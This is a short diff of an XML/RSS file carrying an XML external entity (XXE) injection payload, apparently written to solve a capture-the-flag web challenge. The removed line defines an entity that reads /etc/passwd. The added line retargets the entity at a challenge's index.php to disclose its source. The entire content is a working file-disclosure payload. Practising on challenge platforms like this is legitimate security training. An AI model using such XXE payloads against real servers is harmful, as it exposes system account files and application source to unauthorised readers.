@@ -1,5 +1,5 @@
 <?xml version="1.0" encoding="UTF-8" ?>
-<!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///challenge/web-serveur/ch29/index.php">]>
 <rss version="2.0">
 
 <channel>
